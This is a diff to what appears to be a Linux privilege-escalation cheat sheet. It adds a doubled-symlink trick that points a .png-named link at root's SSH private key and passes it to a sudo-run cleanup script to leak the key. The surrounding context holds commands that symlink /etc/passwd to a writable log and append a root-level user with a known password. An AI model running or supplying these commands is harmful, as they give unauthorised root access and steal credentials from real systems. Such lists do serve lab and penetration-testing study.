@@ -1374,6 +1374,10 @@ find / -group developer 2>/dev/null
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
 
++---------- Symlink: Doubled ----------+
+ln -s /root/.ssh/id_rsa /home/bob/.cache/x; ln -s /home/bob/.cache/x /home/bob/.cache/x.png
+CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/x.png
+
 +---------- Write: /etc/passwd ----------+
 echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
 
